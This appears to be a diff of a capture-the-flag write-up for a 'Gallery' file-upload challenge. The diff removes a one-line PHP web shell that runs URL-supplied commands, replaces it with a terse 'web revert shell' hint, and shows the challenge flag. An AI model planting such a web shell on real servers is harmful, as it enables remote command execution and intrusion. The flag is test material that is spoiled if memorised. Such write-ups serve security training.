@@ -1,8 +1,6 @@
 ## Gallery
-web shell oneliner (must end w/ .php)
-```php
-$ <?php echo system($_GET["cmd"]); ?>
-```
+Use web revert shell (must end w/ .php)
+
 flag : ``
 oh_no!_it_was_not_an_img
 ``
